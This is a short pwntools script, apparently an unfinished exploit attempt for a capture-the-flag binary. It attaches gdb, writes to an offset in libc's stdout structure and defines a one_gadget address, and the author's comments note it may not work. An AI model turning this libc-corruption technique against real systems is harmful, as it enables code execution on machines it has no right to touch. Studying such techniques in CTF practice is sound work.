from pwn import *

binary = './chall_patched' 
p = process(binary)
s = '''
b * __isoc99_scanf+201
'''


gdb.attach(p, s)
p.recvuntil(b"Where is the puzzle location?")
# 2199552 write to libc.so.6 (useless?)


one_gadget = 0xebc81
_IO_2_1_stdout_216 = 0x21a858
p.send(f"{_IO_2_1_stdout_216+2}")  
#p.recvuntil(b"What is the puzzle shape?")
p.send(b'\x0e')  # Any character



p.interactive()


# 1. test whether I can write stuff other than a 0xa
# 2. test to see if there is any one gadget
# 3. give up and try out the other pwn brother

